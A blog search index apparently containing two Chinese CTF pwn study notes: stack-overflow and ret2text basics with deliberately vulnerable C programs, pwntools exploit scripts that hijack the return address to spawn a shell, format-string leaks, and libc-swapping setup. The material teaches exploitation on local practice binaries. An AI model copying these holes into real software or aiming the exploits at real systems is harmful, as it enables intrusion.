@@ -1,0 +1,672 @@
+<?xml version="1.0" encoding="utf-8"?>
+<search>
+  <entry>
+    <title>pwn学习路线</title>
+    <url>/2026/06/21/pwn/pwn%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/</url>
+    <content><![CDATA[<p>CTFwiki：<a href="https://ctf-wiki.org/pwn/linux/user-mode/environment/">https://ctf-wiki.org/pwn/linux/user-mode/environment/</a></p>
+<h1 id="Linux环境"><a href="#Linux环境" class="headerlink" title="Linux环境"></a>Linux环境</h1><h2 id="学习pwn需要的环境和工具"><a href="#学习pwn需要的环境和工具" class="headerlink" title="学习pwn需要的环境和工具"></a>学习pwn需要的环境和工具</h2><p>需要安装python的第三方库pwntools、gdb的增强版pwndbg、ruby语言里的Onegadget，其他的工具任意，具体安装步骤在B站的星盟pwn讲学的第一章(pwn环境的搭建)。</p>
+<p>ida可以到爱盘(吾爱破解)里面找到</p>
+<p>Ubuntu我装的是20</p>
+<span id="more"></span>
+
+<p><strong>注意：</strong></p>
+<p>在自己编译程序的时候，想要关闭一些保护，方法如下：</p>
+<p><strong>NX</strong>	<code>-z execstack</code> &#x2F; <code>-z noexecstack</code> (关闭 &#x2F; 开启)  不让执行栈上的数据，于是JMP ESP就不能用了</p>
+<p><strong>Canary</strong>	<code>-fno-stack-protector</code> &#x2F;<code>-fstack-protector</code> &#x2F; <code>-fstack-protector-all</code> (关闭 &#x2F; 开启 &#x2F; 全开启) 栈里插入cookie信息</p>
+<p><strong>PIE</strong>	<code>-no-pie</code> &#x2F; <code>-pie</code> (关闭 &#x2F; 开启)  地址随机化，另外打开后会有<em>get_pc_thunk</em></p>
+<p><strong>RELRO</strong>	<code>-z norelro</code> &#x2F; <code>-z lazy</code> &#x2F; <code>-z now</code> (关闭 &#x2F; 部分开启 &#x2F; 完全开启) 对GOT表具有写权限</p>
+<p>如果不想把一些危险的函数进行优化，可以使用 <code>-fno-builtin</code></p>
+<p>如果想编译出来的程序是32位的，可以使用 <code>-m32</code></p>
+<p>附：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">//编译32位出错的话，可以在终端执行如下指令后再进行编译</span><br><span class="line"><span class="built_in">sudo</span> apt-get update</span><br><span class="line"></span><br><span class="line"><span class="built_in">sudo</span> apt-get purge libc6-dev</span><br><span class="line"></span><br><span class="line"><span class="built_in">sudo</span> apt-get install libc6-dev</span><br><span class="line"></span><br><span class="line"><span class="built_in">sudo</span> apt-get install libc6-dev-i386</span><br></pre></td></tr></table></figure>
+
+<p>编写源码的初始化</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">init</span><span class="params">()</span> &#123; </span><br><span class="line">setbuf(<span class="built_in">stdin</span>,<span class="number">0</span>);</span><br><span class="line">setbuf(<span class="built_in">stdout</span>,<span class="number">0</span>);</span><br><span class="line">setbuf(<span class="built_in">stderr</span>,<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="用户模式"><a href="#用户模式" class="headerlink" title="用户模式"></a>用户模式</h2><h3 id="栈利用"><a href="#栈利用" class="headerlink" title="栈利用"></a>栈利用</h3><h4 id="栈介绍以及栈溢出原理"><a href="#栈介绍以及栈溢出原理" class="headerlink" title="栈介绍以及栈溢出原理"></a>栈介绍以及栈溢出原理</h4><p>在数据结构里面第一次接触到栈，栈和队列不一样，栈的数据结构是先进后出(FILO)，c++的STL库里也为我们提供了stack这种数据容器，栈的操作主要是入栈(压栈)和出栈。</p>
+<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/202203290800134.png" alt="栈的结构" style="zoom:67%;" />
+
+<p>在汇编语言(可以看看B站里小甲鱼讲的)里面有一个专门定义栈的段(栈段)，可以看到，程序中栈的地址空间是从高地址向低地址增长(预设好栈的空间)。</p>
+<p>注意：x86(32)和x64(64)程序的区别</p>
+<p><strong>x86</strong></p>
+<p>函数参数在函数返回地址的上方</p>
+<p><strong>x64</strong></p>
+<p>1、前6个整数或指针参数依次保存在<strong>rdi、rsi、rdx、rcx、r8、r9</strong>寄存器中，再多的话放到栈上</p>
+<p>2、内存地址不能大于<strong>0x00007FFFFFFFFFFF</strong>，<strong>6个字节长度</strong>，否则抛出异常</p>
+<p><strong>栈是如何通过溢出造成漏洞？</strong></p>
+<p>向栈中某个变量写入的字节长度&gt;变量申请的字节长度，进而导致改变与其相邻的栈中的变量的值。</p>
+<p>想要造成栈溢出，至少需要满足：1、必须向栈上写入数据	2、允许写入的数据大于变量申请的空间</p>
+<p><strong>使用一个例子(ret2xxx)</strong></p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">success</span><span class="params">()</span> &#123; <span class="built_in">puts</span>(<span class="string">&quot;You Hava already controlled it.&quot;</span>); &#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">vulnerable</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">12</span>];</span><br><span class="line">  gets(s);</span><br><span class="line">  <span class="built_in">puts</span>(s);</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span> &#123;</span><br><span class="line">  vulnerable();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//gcc -m32 -fno-stack-protector -no-pie stack.c -o stack </span></span><br></pre></td></tr></table></figure>
+
+<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/202204032358943.png" alt="image-20220403235858877" style="zoom:80%;" />
+
+<p>看到<strong>gets</strong>和<strong>puts</strong>函数，简直是标配的ret2xxx，32位的传参顺序如上，直接用脚本了(需要安装第三方库pwntools)</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># 构造与程序交互的对象</span></span><br><span class="line">sh = process(<span class="string">&#x27;./stack&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./stack&#x27;</span>)</span><br><span class="line">success_addr = <span class="number">0x0804843b</span>		<span class="comment">#也可以直接使用pwntools中的函数自动查询，success_addr=elf.sym[&#x27;success&#x27;]</span></span><br><span class="line"><span class="comment"># 构造payload</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">0x14</span> + <span class="string">&#x27;bbbb&#x27;</span> + p32(success_addr)</span><br><span class="line"><span class="built_in">print</span> p32(success_addr)</span><br><span class="line"><span class="comment"># 向程序发送字符串</span></span><br><span class="line">sh.sendline(payload)</span><br><span class="line"><span class="comment"># 将代码交互转换为手工交互</span></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+
+<p><strong>栈溢出的总结</strong></p>
+<p>利用一些危险的函数，确定程序是否有溢出及其位置，一些常见的危险函数如下：</p>
+<p>**input：**gets(直接读取一行，忽略’\x00’)、scanf、vscanf</p>
+<p>**output：**sprintf</p>
+<p>**string：**strcpy、strcat、bcopy</p>
+<p><strong>对于填充的长度</strong></p>
+<p>ida一打开对于字符串数组变量的长度，一般看ebp就知道了，还有一些变量是直接地址索引的，相当于直接给出地址</p>
+<h4 id="基本ROP"><a href="#基本ROP" class="headerlink" title="基本ROP"></a>基本ROP</h4><p><strong>ROP 是啥呢</strong></p>
+<p>ROP(Return Oriented Programming)，其主要思想是在<strong>栈缓冲区溢出的基础上，利用程序中已有的小片段 (gadgets) 来改变某些寄存器或者变量的值，从而控制程序的执行流程。</strong></p>
+<p>这类题目一般开启NX保护</p>
+<p>ROP攻击一般需要满足一些条件：</p>
+<p>1、程序存在溢出，并且考研控制返回地址</p>
+<p>2、可以找到满足条件的gadgets以及相应gadgets地址</p>
+<h5 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a>ret2text</h5><p>ret2text即控制程序本身已经有的代码 (.text)。</p>
+<p>示例源码：</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//name:stack01.c</span></span><br><span class="line"><span class="comment">//gcc -m32 -no-pie -z noexecstack -fno-stack-protector -z lazy stack01.c -o stack01</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">backdoor</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Congratulations,you find it!&quot;</span>);</span><br><span class="line">	system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">vulnerable</span><span class="params">()</span> </span><br><span class="line">&#123;</span><br><span class="line">  	<span class="type">char</span> s[<span class="number">12</span>];</span><br><span class="line"> 	gets(s);</span><br><span class="line">  	<span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">init</span><span class="params">()</span> </span><br><span class="line">&#123; </span><br><span class="line">	setbuf(<span class="built_in">stdin</span>,<span class="number">0</span>);</span><br><span class="line">	setbuf(<span class="built_in">stdout</span>,<span class="number">0</span>);</span><br><span class="line">	setbuf(<span class="built_in">stderr</span>,<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	init();</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Hello,ctfer!&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Can you find backdoor?&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Let&#x27;s sign in!&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Give me your choice:&quot;</span>);</span><br><span class="line">	vulnerable();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>可以看到满足栈溢出的条件(有gets函数)，同时，在代码段里面，看到了调用了system(“&#x2F;bin&#x2F;sh”)</p>
+<p>检查保护</p>
+<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/202204041004930.png" alt="image-20220404100423876" style="zoom:80%;" />
+
+<p>看看ida里面反汇编</p>
+<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/202204041007160.png" alt="image-20220404100757120" style="zoom:80%;" />
+
+<p>gets函数明显存在栈溢出</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">填充的长度:junk=b&#x27;a&#x27;*(0x14+4)		#如果是64位就加8</span><br></pre></td></tr></table></figure>
+
+<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/202204041009646.png" alt="image-20220404100938611" style="zoom:80%;" />
+
+<p>哦吼，直接让gets函数的返回地址改为backdoor不就好了</p>
+<p>exp</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span>		<span class="comment">#设置运行的py等级为调试</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#io=remote(,)					#这里没有放到服务器上，打本地就行了</span></span><br><span class="line">io=process(<span class="string">&#x27;./stack&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./stack&#x27;</span>)</span><br><span class="line"></span><br><span class="line">junk=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x14</span>+<span class="number">4</span>)</span><br><span class="line">backdoor=elf.sym[<span class="string">&#x27;backdoor&#x27;</span>]	<span class="comment">#利用pwntools自带的函数查询backdoor地址</span></span><br><span class="line"></span><br><span class="line">payload=junk+p32(backdoor)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/202204041014085.png" alt="image-20220404101444024" style="zoom:80%;" />
+
+<h5 id="ret2shellcode"><a href="#ret2shellcode" class="headerlink" title="ret2shellcode"></a>ret2shellcode</h5><p>原理：控制程序执行shellcode</p>
+<p><strong>什么是shellcode?</strong>	答：用于完成某个功能的汇编代码。</p>
+<p>对于做题而言，一般我们需要填充一些可执行的代码。这类题目一般需要两个前提，即存在栈溢出，且填充的shellcode所在的区域有可执行的<strong>权限</strong>。</p>
+<h3 id="格式化字符串"><a href="#格式化字符串" class="headerlink" title="格式化字符串"></a>格式化字符串</h3><h4 id="定义-wiki"><a href="#定义-wiki" class="headerlink" title="定义(wiki)"></a>定义(wiki)</h4><p>格式化字符串（英语：format string）是一些程序设计语言的输入&#x2F;输出库中能将字符串参数转换为另一种形式输出的函数(学过c语言容易理解)。通俗的说，就是把计算机存储的相关数据变成人们可以看懂的字符串形式。</p>
+<p>举个例子</p>
+<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220430190154204.png" alt="image-20220430190154204" style="zoom:80%;" />
+
+<p>格式化占位符的语法如下</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%[parameter][flags][field width][.precision][length]type</span><br></pre></td></tr></table></figure>
+
+<p>其中，parameter可以忽略或者是<code>n$</code></p>
+<blockquote>
+<p>n是用这个格式说明符（specier）显示第几个参数；这使得参数可以输出多次，使<br>用多个格式说明符，以不同的顺序输出。</p>
+</blockquote>
+<p>flags可为0或者多个</p>
+<blockquote>
+<p>重点关注字符’#’</p>
+<table>
+<thead>
+<tr>
+<th>字符</th>
+<th>意思</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>#</td>
+<td>对于’ g ‘与’ G ‘，不删除尾部0以表示精度。对于’ f ‘, ‘ F ‘, ‘ e ‘, ‘ E ‘, ‘ g ‘, ‘ G ‘,总是输出小数点。对于’ o ‘, ‘ x ‘, ‘ X ‘, 在非0数值前分别输出前缀0 , 0x , 0X 表示数制。</td>
+</tr>
+</tbody></table>
+</blockquote>
+<p>field width表示数值的最小宽度，典型用于制表输出时填充固定宽度的表目</p>
+<p>Precision通常指明输出的最大长度，依赖于特定的格式化类型</p>
+<p>length指出浮点型参数或整型参数的长度</p>
+<p><strong>Type</strong>，也称转换说明，常见的</p>
+<blockquote>
+<p>%d - 十进制 - 输出十进制整数</p>
+<p>%s - 字符串 - 从内存中读取字符串(string)</p>
+<p>%x - 十六进制 - 输出十六进制数</p>
+<p>%c - 字符 - 输出字符(char)</p>
+<p>%p - 指针 - 指针地址(这个经常用)</p>
+</blockquote>
+<p>在c的代码中，常见的格式化字符串函数有：</p>
+<p>输入：scanf</p>
+<p>输出：printf、fprintf(目前做的题目碰到printf比较多)</p>
+<h4 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h4><p>攻击的方式很简单，因为printf函数中的相关参数都会从栈上去一个数值视作地址然后去访问，地址可能是不存在或者禁止访问，最后使得程序崩溃掉</p>
+<p><strong>举个例子</strong></p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//源码</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">100</span>];</span><br><span class="line">  <span class="type">int</span> a = <span class="number">1</span>, b = <span class="number">0x22222222</span>, c = <span class="number">-1</span>;</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, s);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%08x.%08x.%08x.%s\n&quot;</span>, a, b, c, s);</span><br><span class="line">  <span class="built_in">printf</span>(s);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//name:  pwn.c</span></span><br><span class="line"><span class="comment">//gcc -m32 -fno-stack-protector -no-pie -o pwn pwn.c</span></span><br></pre></td></tr></table></figure>
+
+<p>编译后检查一下保护(编译时候报警告不需要管，就是要对这个危险的函数进行leak的嘛)</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[*] &#x27;/home/vi0let/文档/pwn/笔记/study/pwn&#x27;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>
+
+<p>跑一下看看(可以使用，-分隔但是不能使用空格会被截断的)</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜  study ./pwn</span><br><span class="line">%08x,%08x,%08x</span><br><span class="line">00000001.22222222.ffffffff.%08x,%08x,%08x</span><br><span class="line">ffbc1780,f7f03990,080491d1</span><br></pre></td></tr></table></figure>
+
+<p>再使用gdb调试一下</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜  study gdb pwn</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">pwndbg&gt; b <span class="built_in">printf</span></span><br><span class="line">Breakpoint 1 at 0x8049070</span><br><span class="line">pwndbg&gt; r</span><br><span class="line">Starting program: /home/vi0let/文档/pwn/笔记/study/pwn </span><br><span class="line">%08x,%08x,%08x</span><br></pre></td></tr></table></figure>
+
+<p>可以看到</p>
+<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220430212855488.png" alt="image-20220430212855488" style="zoom:80%;" />
+
+<p>因为之前已经在程序中对调用printf函数下了断点，所以执行的时候自然就停了下来</p>
+<p>明显看到栈上的分布，第一个变量是<strong>返回地址</strong>，第二个变量是<strong>格式化字符串</strong>地址，第三个变量是<strong>a的值</strong>，第四个变量是<strong>b的值</strong>，第五个变量是<strong>c的值</strong>，第六个变量为<strong>我们输入的格式化字符串对应的地址</strong>。</p>
+<p>继续调试</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; c</span><br><span class="line">Continuing.</span><br><span class="line">00000001.22222222.ffffffff.%08x,%08x,%08x</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">pwndbg&gt; c</span><br><span class="line">Continuing.</span><br><span class="line">ffffcfd0,f7ffd990,080491d1[Inferior 1 (process 8801) exited normally]</span><br></pre></td></tr></table></figure>
+
+<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220430214716359.png" alt="image-20220430214716359" style="zoom:80%;" />
+
+<p>和上面第一次调用printf类似</p>
+<p>同样可以使用**%p,%p,%p**(建议以后使用%p 因为不用考虑位数的问题)，或者**%3$p**在第二次打印的时候打印出第三个参数的地址。</p>
+<p>如果参数之间用空格分隔的话(%p %p %p)，会出现这样的情况</p>
+<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220502192058542.png" alt="image-20220502192058542" style="zoom:80%;" />
+
+<p>这是因为%s格式化字符串会到空格这里截断。</p>
+<p>上面的一个例子可以发现</p>
+<ul>
+<li>%p可以获取对应栈的内存地址</li>
+<li>%s可以显示出变量对应的地址的<strong>内容</strong>，但是会有零截断</li>
+<li>%n$p获取指定参数的值</li>
+</ul>
+<p>很显然，%s打印变量内容，而%p表示内存地址，那么就会有一个想法，变量为%p，就会打印出栈上参数对应的地址咯(在上一题的实验也可以看到)</p>
+<p>所以可以使用<code>[tag]%p%p%p%p%p%p%p%p%p </code>来打印出其格式化字符串的地址。拿刚才的例子试一下</p>
+<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220502193248109.png" alt="image-20220502193248109" style="zoom:80%;" />
+
+<p>用aaaa%4$p打印看看(a的ASCII值是0x61)</p>
+<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220502193443643.png" alt="image-20220502193443643" style="zoom:80%;" />
+]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
+      <tags>
+        <tag>pwn</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>复现题目环境的搭建</title>
+    <url>/2026/06/21/pwn/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA(%E6%9C%AC%E5%9C%B0%E3%80%81%E5%A4%8D%E7%8E%B0)/</url>
+    <content><![CDATA[<h1 id="复现题目的环境搭建"><a href="#复现题目的环境搭建" class="headerlink" title="复现题目的环境搭建"></a>复现题目的环境搭建</h1><h2 id="使用socat"><a href="#使用socat" class="headerlink" title="使用socat"></a>使用socat</h2><p>借鉴的博客：</p>
+<p><a href="https://xineting.github.io/2018/10/01/pwn%E9%A2%98%E7%9B%AE%E7%9A%84%E6%90%AD%E5%BB%BA/">https://xineting.github.io/2018/10/01/pwn%E9%A2%98%E7%9B%AE%E7%9A%84%E6%90%AD%E5%BB%BA/</a></p>
+<h2 id="使用ctf-xinetd-ctf竞赛权威指南-pwn篇"><a href="#使用ctf-xinetd-ctf竞赛权威指南-pwn篇" class="headerlink" title="使用ctf-xinetd(ctf竞赛权威指南 pwn篇)"></a>使用ctf-xinetd(ctf竞赛权威指南 pwn篇)</h2><p>Linux版本：Ubuntu16.04</p>
+<span id="more"></span>
+
+<p>借鉴的博客：</p>
+<p>docker安装：<a href="https://blog.csdn.net/weixin_45358193/article/details/103679142">https://blog.csdn.net/weixin_45358193/article/details/103679142</a></p>
+<p>相关的配置：<a href="https://blog.csdn.net/weixin_46521144/article/details/120572274">https://blog.csdn.net/weixin_46521144/article/details/120572274</a></p>
+<p>ctf竞赛权威指南(pwn篇)：P100~P103</p>
+<p>缺点：一次只能部署一题，适用于自己在本地练习</p>
+<h2 id="使用pwn-deploy-chroot"><a href="#使用pwn-deploy-chroot" class="headerlink" title="使用pwn_deploy_chroot"></a>使用pwn_deploy_chroot</h2><p>Linux版本：Ubuntu20.04</p>
+<p>借鉴的博客：</p>
+<p>多题部署：<a href="https://blog.csdn.net/u012763794/article/details/82988934">https://blog.csdn.net/u012763794/article/details/82988934</a></p>
+<h2 id="修改程序运行的libc"><a href="#修改程序运行的libc" class="headerlink" title="修改程序运行的libc"></a>修改程序运行的libc</h2><p>Linux版本：Ubuntu16失败了，但是Ubuntu20可以(16问题太多…)</p>
+<h3 id="安装patchelf"><a href="#安装patchelf" class="headerlink" title="安装patchelf"></a>安装patchelf</h3><p>直接安装</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt install patchelf </span><br></pre></td></tr></table></figure>
+
+<h3 id="glibc-all-in-one"><a href="#glibc-all-in-one" class="headerlink" title="glibc-all-in-one"></a>glibc-all-in-one</h3><p>项目地址：<a href="https://github.com/matrix1001/glibc-all-in-one">https://github.com/matrix1001/glibc-all-in-one</a></p>
+<p>(建议到项目地址看一下用法)</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#clone一下项目</span></span><br><span class="line">git <span class="built_in">clone</span> https://github.com/matrix1001/glibc-all-in-one</span><br><span class="line"></span><br><span class="line"><span class="comment">#更新一下收集到的glibc</span></span><br><span class="line">./update_list</span><br><span class="line">[+] Common list has been save to <span class="string">&quot;list&quot;</span></span><br><span class="line">[+] Old-release list has been save to <span class="string">&quot;old_list&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#查看新的glibc</span></span><br><span class="line"><span class="built_in">cat</span> list</span><br><span class="line">2.23-0ubuntu10_amd64</span><br><span class="line">2.23-0ubuntu10_i386</span><br><span class="line">2.23-0ubuntu11_amd64</span><br><span class="line">2.23-0ubuntu11_i386</span><br><span class="line">2.23-0ubuntu3_amd64</span><br><span class="line">2.23-0ubuntu3_i386</span><br><span class="line">2.27-3ubuntu1_amd64</span><br><span class="line">2.27-3ubuntu1_i386</span><br><span class="line">2.28-0ubuntu1_amd64</span><br><span class="line">2.28-0ubuntu1_i386</span><br><span class="line">......</span><br><span class="line"></span><br><span class="line"><span class="comment">#查看旧的libc(注意：2.26版本在这里)</span></span><br><span class="line"><span class="built_in">cat</span> old_list</span><br><span class="line">2.21-0ubuntu4.3_amd64</span><br><span class="line">2.21-0ubuntu4.3_amd64</span><br><span class="line">2.21-0ubuntu4_amd64</span><br><span class="line">2.21-0ubuntu4_amd64</span><br><span class="line">2.24-3ubuntu1_amd64</span><br><span class="line">2.24-3ubuntu1_amd64</span><br><span class="line">2.24-3ubuntu2.2_amd64</span><br><span class="line">2.24-3ubuntu2.2_amd64</span><br><span class="line">2.24-9ubuntu2.2_amd64</span><br><span class="line">2.24-9ubuntu2.2_amd64</span><br><span class="line">......</span><br><span class="line"></span><br><span class="line"><span class="comment">#下载glibc</span></span><br><span class="line"><span class="comment">#./download xxx			#新</span></span><br><span class="line"><span class="comment">#./download_old xxx		#旧</span></span><br><span class="line">./download 2.23-0ubuntu11.3_i386 </span><br><span class="line">./download 2.23-0ubuntu11.3_amd64</span><br><span class="line">...										<span class="comment">#下载你需要的libc</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>如果下载失败，提示ar命令报错，需要安装</strong></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt install binutils</span><br></pre></td></tr></table></figure>
+
+<p>设置好后如下</p>
+<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220803165729963.png" alt="image-20220803165729963" style="zoom:80%;" />
+
+<p>这里我需要的是32位的版本，需要记住里面对应文件的<strong>绝对路径</strong></p>
+<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/QQ%E5%9B%BE%E7%89%8720220803170024.jpg" alt="QQ图片20220803170024" style="zoom: 80%;" />
+
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜  libs git:(master) <span class="built_in">cd</span> 2.23-0ubuntu11.3_i386 </span><br><span class="line">➜  2.23-0ubuntu11.3_i386 git:(master) <span class="built_in">pwd</span></span><br><span class="line">/home/vi0let/tools/glibc-all-in-one/libs/2.23-0ubuntu11.3_i386</span><br><span class="line">➜  2.23-0ubuntu11.3_i386 git:(master) </span><br></pre></td></tr></table></figure>
+
+<h4 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h4><p><strong>这里这两个文件不需要复制到题目对应的文件夹下！否则后面使用gdb调试的时候会出现错误！！！</strong></p>
+<h3 id="修改程序的libc"><a href="#修改程序的libc" class="headerlink" title="修改程序的libc"></a>修改程序的libc</h3><p>看一下<code>patchelf</code>的用法</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜  tmp patchelf --<span class="built_in">help</span></span><br><span class="line">syntax: patchelf</span><br><span class="line">  [--set-interpreter FILENAME]</span><br><span class="line">  [--page-size SIZE]</span><br><span class="line">  [--print-interpreter]</span><br><span class="line">  [--print-soname]		Prints <span class="string">&#x27;DT_SONAME&#x27;</span> entry of .dynamic section. Raises an error <span class="keyword">if</span> DT_SONAME doesn<span class="string">&#x27;t exist</span></span><br><span class="line"><span class="string">  [--set-soname SONAME]		Sets &#x27;</span>DT_SONAME<span class="string">&#x27; entry to SONAME.</span></span><br><span class="line"><span class="string">  [--set-rpath RPATH]</span></span><br><span class="line"><span class="string">  [--remove-rpath]</span></span><br><span class="line"><span class="string">  [--shrink-rpath]</span></span><br><span class="line"><span class="string">  [--allowed-rpath-prefixes PREFIXES]		With &#x27;</span>--shrink-rpath<span class="string">&#x27;, reject rpath entries not starting with the allowed prefix</span></span><br><span class="line"><span class="string">  [--print-rpath]</span></span><br><span class="line"><span class="string">  [--force-rpath]</span></span><br><span class="line"><span class="string">  [--add-needed LIBRARY]</span></span><br><span class="line"><span class="string">  [--remove-needed LIBRARY]</span></span><br><span class="line"><span class="string">  [--replace-needed LIBRARY NEW_LIBRARY]</span></span><br><span class="line"><span class="string">  [--print-needed]</span></span><br><span class="line"><span class="string">  [--no-default-lib]</span></span><br><span class="line"><span class="string">  [--debug]</span></span><br><span class="line"><span class="string">  [--version]</span></span><br><span class="line"><span class="string">  FILENAME</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure>
+
+<p>其中用到的两个如下</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">patchelf --replace-needed libc.so.6 你要换的libc的绝对路径 ./elfname</span><br><span class="line">patchelf --set-interpreter ld的绝对路径 ./elfname</span><br></pre></td></tr></table></figure>
+
+<p><strong>执行</strong></p>
